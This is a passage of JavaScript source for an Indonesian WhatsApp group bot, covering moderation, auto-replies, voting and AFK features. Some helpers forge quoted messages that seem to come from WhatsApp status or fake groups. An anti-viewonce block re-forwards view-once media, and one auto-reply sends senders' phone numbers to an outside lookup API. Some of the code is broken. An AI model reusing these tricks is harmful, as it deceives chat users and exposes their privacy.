                    xdev.sendMessage(from, teks, audio, {mimetype: 'audio/mp4', quoted: dev, ptt: true})
         } 
	
        const reply1 = (text) => {
                xdev.sendMessage(from, text, MessageType.text, {contextInfo:{forwardingScore: 508, isForwarded: true}, quoted: dev, sendEphemeral: true ,thumbnail: fs.readFileSync(`./stik/thumb.jpeg`)})
        }
        const reply = (teks) => {
                  xdev.sendMessage(from, teks, text, { quoted: dev });
      };
      const reply2 = (teks) => {
			xdev.sendMessage(from, teks, text, { thumbnail: sampah, sendEphemeral: true, quoted: dev, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${fake1}`,body:"",previewType:"PHOTO",thumbnail:sampah}}})
		}
        const jawab = (text) => {
                xdev.sendMessage(from, text, MessageType.text, {quoted: dev})
        }
        const sendMess = (teks) => {
            xdev.sendMessage(from, teks, text)
        }
        
	
		
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? xdev.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr, forwardingScore: totalForward, isForwarded: forwarding } }) : xdev.sendMessage(from, teks.trim(), extendedText, { quoted: dev, contextInfo: { "mentionedJid": memberr, forwardingScore: totalForward, isForwarded: forwarding } })
        }
        const costum = (pesan, tipe, target, target2) => {
			xdev.sendMessage(from, pesan, tipe, {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }},contextInfo: forward})
		}
		const sendSticker = (pesan,tipe) => {
			xdev.sendMessage(from, pesan, tipe, {quoted: dev, contextInfo: forward})
		}
		const sendSticker1 = (pesan,tipe) => {
			xdev.sendMessage(from, pesan, tipe)
		}
        const math = (teks) => {
				return Math.floor(teks)
		}
        const fakestatus = (teks) => {
            xdev.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            xdev.sendMessage(from, teks, image, {thumbnail: fakethumbnail, quoted:dev,caption:yes})
        }
        const fakegroup = (teks) => {
            xdev.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
 
 
 
 
 
 
 
 
 
 
 
//******************* 》NO API《 ********************\\

        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        xdev.sendMessage(to, media, sticker,{quoted:dev})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = video
                        mime = sticker
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = audio
                    }
                    xdev.sendMessage(to, media, type, { quoted: dev, caption: text, contextInfo: forward})
                    wait = false
                    fs.unlinkSync(filename)
                });
            }   
            
           const sendFileFromUrl = async(link, type, options) => {
           
           hasil = await getBuffer(link)
	       xdev.sendMessage(from, hasil, type, options).catch(e => {
	       fetch(link).then((hasil) => {
	       xdev.sendMessage(from, hasil, type, options).catch(e => {
	       xdev.sendMessage(from, { url : link }, type, options).catch(e => {
	       reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	
	       console.log(e)
})
})
})
})
}
const sendWebp = async(to, url) => {
           var names = Date.now() / 10000;
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
}
            

            
            
            
            
                    
            

            
//******************* 》SECURITY《 ********************\\
            
//ANTI VIO 
       if (!dev.key.fromMe && isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {       	
      jawab(`@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`);
      var msg = { ...dev };
      msg.dev = dev.message.viewOnceMessage.message;
      msg.dev[Object.keys(msg.dev)[0]].viewOnce = false;
      xdev.copyNForward(m.chat, msg);
      }
       if (!dev.key.fromMe && Antivo === true && !isGroup && m.mtype == "viewOnceMessage") {       	
      jawab(`*Antiviewonce*!`);
      var msg = { ...dev };
      msg.dev = dev.message.viewOnceMessage.message;
      msg.dev[Object.keys(msg.dev)[0]].viewOnce = false;
      xdev.copyNForward(m.chat, msg);
      }
    
    
//ANTI HIDETAGG
       if (isGroup && !dev.key.fromMe && m.message[m.mtype]?.contextInfo?.mentionedJid?.length == groupMembers.length) {
      console.log( color("[HIDETAG]", "blue"), color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "cyan") );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
       }
       
       if (isGroup && m.message[m.mtype]?.contextInfo?.mentionedJid?.length == groupMembers.length) {
       if (!isAntihidetag) return
       if (isGroupAdmins) return reply('Admin bebas pakai hidetag dong :v')
      console.log( color("[ANTI-HIDETAG]", "red"), color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "cyan") );
      reply(`Maaf, Botz akan mengeluarkan kamu karena kamu terdetaksi mengirim pesan hidetag`);
      setTimeout(() => {
      xdev.groupRemove(from, [sender]);
      },3000)
       }
           

//ANTI TROLI 
if (m.message  && !m.key.fromMe && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antibugtroli === false) return
if(jeda === true) return
 jeda = true
m.reply('Troli Detected\n\n' + require('util').format(m.key))
await xdev.modifyChat(m.chat, 'delete', {
 includeStarred: false
})
setTimeout( () => {
jeda = false
},2000)
}



      

 
     


//ANTI BADWORD 
          if (isGroup && Toxic && !isOwner && !isGroupAdmins && !dev.key.fromMe){
          if(isAdmin) return 
          if(jeda === true) return
           if (badword.includes(messagesC)) {
          if (isCountKasar(sender, senbadword)){
          jeda = true
          if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin`)
          reply(`*「 ANTI BADWORD 」*\n\nSepertinya kamu sudah berkata kasar lebih dari 5x, maaf kamu akan di kick`)
         setTimeout( () => {
          xdev.groupRemove(from, [sender])
          },3000)
          delCountKasar(sender, senbadword)
          jeda = false
           } else {
          addCountKasar(sender, senbadword)
          reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick oleh botz`)
           }
           }
           }
           
           
      
//ANTI LINK GROUP
				if (budy.includes("https://")) {
				if (!isGroup) return
				if (!isAntiLink) return
				if (isGroupAdmins) return reply('Alah sia admin grup mah bebas yekan :v')
				linkgc = await xdev.groupInviteCode(from)
				if (budy.includes(`${linkgc}`)) return reply ('Wuanjir kirain link grup lain, huh hampir aja kena kick 😆')
				if (budy.includes('zinadmin')) return reply('izinadmin diterima')
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`
				reply(` *「 LINK DETECTED 」*\nKamu mengirimkan link, maaf kamu di kick dari grup :(`)
				setTimeout(() => {
				xdev.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
				}, 2000)
			    }
			
			
			
//ANTI VIRUS
    if (budy.length > 4000) {
    if (!isGroup) return reply("Virtex terdeteksi")
    if (!AntiVirtex) return
    if (isGroupAdmins) return jawab('*VIRTEX DETECTED*')
    console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
    await xdev.sendMessage(from, antivirus(pushname,groupName), text)
    if (!isBotGroupAdmins) return 
    if(isOwner) return 
    await xdev.sendMessage(from,`「 *VIRTEX DETECTED* 」\n\n Kamu terdeteksi telah mengirim virus? \n Maaf tapi aku harus mengeluarkanmu...\n Selamat tinggal~`,text)
    await xdev.groupRemove(from, [sender])
    await xdev.groupSettingChange(from, GroupSettingChange.messageSend, true)
    }
    
    

 









   
//******************* 》FUNCTION OTHERS《 ********************\\
    
    
    
  //WAKTU TIDUR BOTZ
    if (isCmd && isGroup && timeWib >= '02:00' && timeWib <= '04:00'){
    console.log(color('[KIRARA]', 'blue'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('BOT OFF zzzzz 😴', 'cyan'))
    return sendSticker1(zzz, sticker)
     }

    
//AFK FUNCTION
            cekafk(afk)
            if (!dev.key.remoteJid.endsWith('@g.us') && offline){
            if (!dev.key.fromMe){
            if (isAfk(dev.key.remoteJid)) return
            addafk(dev.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            xdev.sendMessage(dev.key.remoteJid,`@${nomerOwner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${nomerOwner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
            }
            }   
        if (dev.key.remoteJid.endsWith('@g.us') && offline) {
        if (!dev.key.fromMe){
        if (dev.message.extendedTextMessage != undefined){
        if (dev.message.extendedTextMessage.contextInfo != undefined){
        if (dev.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of dev.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${nomerOwner}@s.whatsapp.net`){
        if (isAfk(dev.key.remoteJid)) return
        addafk(dev.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        xdev.sendMessage(dev.key.remoteJid,`@${nomerOwner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${nomerOwner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
  
 
//CMD BUTTON FUNCTION
        selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''
        responseButton = (type == 'listResponseMessage') ? dev.message.listResponseMessage.title : ''
        const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
        let po = xdev.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Pilih Disini","footerText": "Jangan Lupa Donasi Ya Kak ☕","listType": "SINGLE_SELECT","sections": list}}, {})
        return xdev.relayWAMessage(po, {waitForAck: true})
        }
        


//CMD VN FUNCTION
const kpt =['./media/kawai/notfound/ga da.mp3',
                        './media/kawai/notfound/kaga ada.mp3',
                        './media/kawai/notfound/ngomong apaan sih.mp3']        
const oy = kpt[Math.floor(Math.random() * kpt.length)]//ini untuk cmd klo ga ada dalam menu
const yaampun = fs.readFileSync(`${oy}`)

const ktp =['./media/kawai/notfound/ga mau.mp3',
                        './media/kawai/notfound/ga boleh.mp3']
const uy = ktp[Math.floor(Math.random() * ktp.length)]//ini untuk yg terkena vanned
const wuy = fs.readFileSync(`${uy}`)

const kpk =['./media/kawai/asautegodaimas.mp3',
                        './media/kawai/ohayo gosaimase.mp3',
                        './media/kawai/ohayo.mp3']
const ay = kpk[Math.floor(Math.random() * kpk.length)]//ini untuk panggilan jika ada yg manggil botz
const dodo = fs.readFileSync(ay)


//BOT FUNCTION
const oawalah =['iya kak ?','Ada apa kak ?','Bot aktif kak','Aku bukan bot kak, aku ini hooman','Kumaha atuh kak ?','Kunaon kak ?','oy ?',
			'ya ?','Kenapa panggil aku','Ada apa kak kok panggil aku']
                   
const hayuk = oawalah[Math.floor(Math.random() * oawalah.length)]
       
       
//BULLY FUNCTION
const b1 = ["pukulin","kocok"]
            const bully1 = b1[Math.floor(Math.random() * b1.length)]
const b2 = ["gebukin","santet"]
            const bully2 = b2[Math.floor(Math.random() * b2.length)]
const b3 = ["sayang","peluk"]
            const bully3 = b3[Math.floor(Math.random() * b3.length)]
       
       
//Welcome Member  
 if (budy.includes('Salken yak gaes')){
const ajur =[
`Salken juga kak ${pushname}
selamat datang di grup Extream 😁
Jangan main bug disini yak, disini tanya jawab
tentang botz`,
`Hallo kak ${pushname} 
selamat datang di grub 
Extream moga betah yak
tapi jangan main bug bug oke`,
`Yahaha, salam kenal juga kak ${pushname}
 welcome in gc Extream
di sini kita tanya jawab tentang botz 
tapi jangan main bug yak 😁`,
`Awokawok masuk lewat tautan 🤣
Salken juga kak ${pushname}
 btw kata katanya bagus :v`,
`Wih the real bucin nih, pandai berkata-kata :v
Salken juga kak ${pushname}, moga betah yak
jangan main bug loh 😁`,
`Wih nih juga pandai berkata-kata nih
penerus masa depan bangsa nih :v
salken juga kak ${pushname}`,
`Awokawok masuk lewat tautan gokil dah :v
Salken juga kak ${pushname} wah kata katanya
sungguh menginspirasi hatiku :v`,
`Buset dah kata katanya membuat 
hatiku cenat cenut
Salken juga kak ${pushname} 
moga betah yak di sini sama akoh :v`,
`Kyaaaaaa 🥰🥰 aku ga tau harus ngomong
apa lagi nih ke kamu, salken juga kak ${pushname}
welcome in gc, jangan maen bug yak`]
                   
const moh = ajur[Math.floor(Math.random() * ajur.length)]
	   xdev.sendMessage(from, moh, text, { quoted: dev })
            }
       
       
//VOTING FUNCTION 
	    if(isGroup && !isVote) {
        if (budy.toLowerCase() === 'vote'){
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '✅'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
        } else if (budy.toLowerCase() === 'devote'){
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
        let fil = vote.map(v => v.participant)
        let id_vote = sender ? sender : '6285751056816@s.whatsapp.net'
        if(fil.includes(id_vote)) {
        return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
        } else {
        vote.push({
            participant: id_vote,
            voting: '❌'
        })
        fs.writeFileSync(`./lib/${from}.json`,JSON.stringify(vote))
        let _p = []
        let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n` 
        for(let i = 0; i < vote.length; i++) {
        _vote +=  `@${vote[i].participant.split('@')[0]}\n*Vote* : ${vote[i].voting}\n\n`
        _p.push(vote[i].participant)
        }  
        _p.push(_votes[0].votes)
        mentions(_vote,_p,true)   
        }
    }
}	
   


              if (budy.includes('ekprefix')){
	            xdev.sendMessage(from, `*Baik kak untuk prefix saat ini adalah:* 「  ${prefa}  」`, text, { quoted: fmenu1, contextInfo: forward })
                   }
                   
         

        






                  if (budy.includes(nomerOwner)) {
                  if(dev.key.fromMe) return
                  	if(isOwner) return
                  	if (isSpammerr) return 
		spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                    },10000)
                  const kta =['*Bentar ya kak nanti juga di bales sama ownerku* 😉',
'*Tunggu aja kak, entar juga di bales* 😁',
'*Iya kak, ada apa tag owner aku nih* 🙂']
					const su = kta[Math.floor(Math.random() * kta.length)]
					xdev.sendMessage(from, su, text, { quoted: dev })
					}
					

// DI BULLY
     if (body.startsWith(`#bully`)){
     if(!isWelkom) return
     if(isExtream) return
     	reply(`Hayuk ah`)
     setTimeout(() => {
          sendButMessage(from, `Enaknya di apain nih 🤭`, `Silahkan pilih salah satu`, [
                      {buttonId: `#${bully1} ${q}`, buttonText: {displayText: `di ${bully1}`,},type: 1},
                      {buttonId: `#${bully2} ${q}`, buttonText: {displayText: `di ${bully2}`,},type: 1},
                      {buttonId: `#${bully3} ${q}`, buttonText: { displayText: `di ${bully3}`,},type: 1}]);
           }, 2000)
           }
           

           
           
           
           
				
           
            
           if (budy.startsWith(`!turnoff`)){
           if(!theOwner) return
           if (mati === true) return reply("Done")
           mati = true
           var groups = xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = xdev.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					const timestampu = speed();
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = xdev.user.phone
stamtus = 
`⍟ ────────────────── ⍟

*SUCCES TURNED OFF*

Private Chat : ${privat.length}
Group Chat : ${groups.length}
Penggunaan Ram : ${ram2}
Platform : ${os.platform()}
Device Model: ${xdev.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${xdev.user.phone.wa_version}
Os Version: ${xdev.user.phone.os_version}

⍟ ────────────────── ⍟`

reply(stamtus)
           }
           
               if (budy.startsWith(`!turnon`)){
               if(!theOwner) return
               if(mati === false) return reply("Done")
           mati = false
           reply("*SUCCES TURNED ON*")
           }
           
           
          if (body.startsWith(`#sayang`)){
          if(!isWelkom) return
          if(isExtream) return
          sendMess(`Ciee di sayang\nUntuk @${q} kamu di sayang😘 sama ${pushname} awokawok`)
           }
           
           if (body.startsWith(`#peluk`)){
           if(!isWelkom) return
           if(isExtream) return
          sendMess(`Ciee di peluk\nuntuk @${q} kamu mau gak di peluk sama ${pushname} :v`)
           }
           
           if (body.startsWith(`#gebukin`)){
           if(!isWelkom) return
           if(isExtream) return
          reply(`@${q} Berhasil di gebukin dan sekarang babak belur + bonyok :v`)
           }
           
           if (body.startsWith(`#pukulin`)){
           if(!isWelkom) return
           if(isExtream) return
          reply(`@${q} Berhasil di pukulin dan sekarang dia bonyok-bonyok :v`)
           }
           
           if (body.startsWith(`#santet`)){
           if(!isWelkom) return
           if(isExtream) return
          reply(`Berhasil menyantet si @${q} dan sekarang dia mencret paku`)
           }
           
           if (body.startsWith(`#kocok`)){
           if(!isWelkom) return
           if(isExtream) return
          reply(`*ERROR*`)
           }
           
//JIKA ADA YG BILANG THANKS, BOT AKAN RESPON
for (let kasih of thanks){
                  if ( budy.includes(kasih)) {
                  if(dev.key.fromMe) return
                  if(isExtream) return
                  if (isOwner) return
                  if (isSpammerr) return 
		         spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                    },10000)
                 if(autosticker === true) return sendSticker(samasama, sticker)
                 reply(`Sama sama kak ${pushname}`)
                  }
                 }


//******************* 》UCAPAN《 ********************\\


//Jika ada yang bilang ohayo bot akan merespon
if(ohayo.includes(messagesC)){
if(isExtream) return
if (isSpammerr) return
spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                      },5000)
if (timeWib >= '11:00' && timeWib <= '23:50')  return reply("Sekarang udah ga pagi 😑")
				sendvn(dodo)
				}
				
				
//Jika ada yang bilang ucpanawaktu bot akan merespon
for(let ucapan of ucap){
if(budy.includes(ucapan)){
if(dev.key.fromMe) return
if (isSpammerr) return
spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                      },7000)
 if (timeWib >= '23:59' && timeWib <= '11:00')  return 
reply(`${ucapanWaktu} kak 🙂`)
				}
				}
        
        
        
        
        
        
        
        
        
//******************* 》BAN CHAT《 ********************\\


//AUTO READ 
     if(autoread === true){
     await xdev.chatRead(from)
     } 
     if(autoread === true){var chatst = await xdev.chats.array.filter(v => v.jid.endsWith('g.us'))
     chatst.map( async ({ jid }) => {
     await xdev.chatRead(jid)
      })
      }
      

//PUBLIC
if (publik === false) {
if (!dev.key.fromMe && !isOwner && !theOwner) return
		}

       
       
            
//ANTI SPAM
        if (isCmd && msgFilter.isFiltered(from) && !isGroup) {
        console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'from', color(pushname))
         if(autosticker === true) return sendSticker(spam1, sticker)
         return reply(spam)
					}
        
        if (isCmd && msgFilter.isFiltered(from) && isGroup) {
        console.log(color('[SPAM]', 'red'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
        if(autosticker === true) return sendSticker(spam1, sticker)
        return reply(spam)
					}
       if (isCmd && !isOwner) msgFilter.addFilter(from)

    
    
    
    
 
    
 
    
    
    
//******************* 》AUTO SYSTEM《 ********************\\
        
//AUTO TYPING
     if(typing === true){
     xdev.updatePresence(from, Presence.composing)
      }
    
//AUTO RESPON
      for (let i = 0; i < commandsDB.length ; i++) {
      if (autorespon === false) return
      if (budy == commandsDB[i].pesan) {
      xdev.sendMessage(from, commandsDB[i].balasan, text, {quoted: dev})
      }
      }
    
//AUTO RESPON SIMI BY DECODE DENPA
       if (!isGroup && !isCmd && !command && !dev.key.fromMe) {
       if (autorespon === false) return
       numd = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
	   simi = await fetchJson(`https://api.simsimi.net/v1/?lang=${numb.data.country_code}&cf=false&text=${cmd}`)
       sami = simi.success
       xdev.sendMessage(from, `_${sami}_`, text, {thumbnail: sampah, sendEphemeral: true, quoted:dev, contextInfo : {forwardingScore: 1, isForwarded: true}})
         }
    
//AUTO RESPON STICKER
    if (setiker.includes(messagesC)){
    if(isExtream) return
    if(autovn === true) return
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/stick/${namastc}.webp`)
	xdev.sendMessage(from, buffer, sticker, {quoted:dev })
	}
	
//AUTO RESPON VN
	for (let anju of audionye){
	if (budy === anju){
	if (isSpammerr) return sendSticker(spam2, sticker)
	buffer = fs.readFileSync(`./temp/audio/${anju}.mp3`)
	xdev.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${pushname} \n「 audio 」 ${anju}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./stik/fake1.jpeg')}}}, ptt: true, contextInfo: forward})
    spamkuyy.push(`${sender.split('@')[0]}@s.whatsapp.net`)
                    fs.writeFileSync("./lib/spam.json", JSON.stringify(spamkuyy))      
                    setTimeout( () => {
                    spamkuyy.splice(`${sender.split('@')[0]}@s.whatsapp.net`, 1)
                    fs.writeFileSync('./lib/spam.json', JSON.stringify(spamkuyy))
                    },10000)  
	}
	}
	
//AUTO RESPON MUSIK
	for (let anjir of musiknye){
	if (budy === anjir || responseButton === anjir ){
    if (wait === true) return sendSticker(spam2, sticker)
         wait = true
	jawab("*Loading...*")
	buffer = fs.readFileSync(`./temp/musik/${anjir}.mp3`)
	xdev.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "0@s.whatsapp.net" } : {})},message: {orderMessage: {itemCount : 2021,status: 1,surface : 2,message: `🆔「 ${pushname} 」\n🎵 ${anjir}`,orderTitle: 'Bang',thumbnail: fs.readFileSync('./stik/fake2.jpeg'), sellerJid: '0@s.whatsapp.net'}}}, ptt: true, contextInfo: forward})
        wait = false
	}
	}
	
//AUTO RESPON IMAGE
	if (imagenye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/foto/${namastc}jpeg`)
	xdev.sendMessage(from, buffer, image, {quoted : dev})
	}

//AUTO RESPON VIDEO
	if (videonye.includes(messagesC)){
	namastc = messagesC
	buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
	xdev.sendMessage(from, buffer, video, {quoted : dev})
	}
	


        


      
//BANNED USER
     if (isCmd && isGroup && !dev.key.fromMe && isBanned){
     if (isBanned) console.log(color('[KIRARA]', 'blue'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('Akun terbanned mencoba mengakses nih kak', 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
     if(autovn === true && isBanned) return sendvn(wuy)
     if (isBanned) return sendSticker(buaned, sticker) //Jika terbanned tidak akan bisa akses fitur saat di dalam group
      }
      if (isCmd && !isGroup && !dev.key.fromMe && !isBanned){
      if (isBanned) console.log(color('[KIRARA]', 'blue'), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('Akun terbanned mencoba mengakses nih kak', 'cyan'), color('dari', 'gold'), color(`${pushname}`, 'orange'))
      if(autovn === true && isBanned) return sendvn(wuy)
      if (isBanned) return sendSticker(buaned, sticker) //Jika terbanned tidak akan bisa akses fitur saat di pc
      }
    
 //AKSES PRIVATE 
  if (!isGroup && !isOwner  && isCmd && chatBot === true) return reply(teksChat)

    


	
//========================================================================================================================//
		colors = ['red','white','black','blue','yellow','green','magenta','cyan','pink','gold','purple','navy','gray']
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
